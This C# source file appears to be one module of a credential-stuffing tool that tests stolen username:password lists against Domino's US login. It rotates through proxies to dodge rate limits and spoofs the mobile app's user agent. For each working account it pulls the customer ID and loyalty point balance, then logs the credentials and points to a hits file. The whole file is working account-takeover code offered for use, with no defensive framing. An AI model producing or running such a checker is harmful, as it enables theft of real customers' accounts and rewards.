using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace DominosUS
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.UserAgent = "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)";
                            string str = "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=" + s[0] + "&password=" + s[1];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Post("https://authproxy.dominos.com/auth-proxy-service/token.oauth2", str, "application/x-www-form-urlencoded").ToString();
                            bool flag12 = text2.Contains("access_token");
                            if (flag12)
                            {
                                string accessToken = Regex.Match(text2, "access_token\":\"(.*?)\"").Groups[1].Value;
                                httpRequest.Authorization = "Bearer " + accessToken;
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                string response = httpRequest.Post("https://order.dominos.com/power/login", $"loyaltyIsActive=true&rememberMe=false&u={s[1]}&p={s[1]}", "application/x-www-form-urlencoded").ToString();
                                string customerId = Regex.Match(response, ",\"CustomerID\":\"(.*?)\"").Groups[1].Value;
                                string response2 = httpRequest.Get($"https://order.dominos.com/power/customer/{customerId}/loyalty?_=1581984138984").ToString();
                                string points = Regex.Match(response2, "VestedPointBalance\":(.*?),").Groups[1].Value;
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - DOMINOS] " + s[0] + ":" + s[1] + $" | Points: {points}", Color.Green);
                                }
                                Export.AsResult("/Dominos_hits", s[0] + ":" + s[1] + $" | Points: {points}");
                                return false;
                            }
                            else
                            {
                                if (text2.Contains("Invalid username & password combination"))
                                {
                                    // Bad
                                    break;
                                }
                                else if (text2.Contains("invalid_grant"))
                                {
                                    break;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
                    